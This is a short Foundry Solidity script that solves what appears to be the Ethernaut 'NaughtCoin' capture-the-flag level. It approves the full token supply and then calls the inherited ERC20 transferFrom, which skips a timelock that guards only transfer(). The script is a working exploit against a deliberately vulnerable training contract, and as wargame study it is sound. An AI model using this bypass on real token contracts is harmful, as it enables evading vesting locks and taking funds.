// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { NaughtCoin } from "../src/level15.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice Abuse ERC20 transferFrom function
contract Level15Solution is Script {
    NaughtCoin level = NaughtCoin(0x816ea40C80cCe74716911e696DE612E15EC5f05f);


    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("balanceBefore: ", level.balanceOf(vm.envAddress("MY_ADDRESS")));
        // This will ensure that you have enough 'allowance' to transfer the token out
        level.approve(address(vm.envAddress("MY_ADDRESS")), level.INITIAL_SUPPLY());
        // By using ERC20's transferFrom() instead, we skip the lockTokens() modifier
        level.transferFrom(address(vm.envAddress("MY_ADDRESS")), address(level), level.INITIAL_SUPPLY());
        console.log("balanceAfter: ", level.balanceOf(vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }
}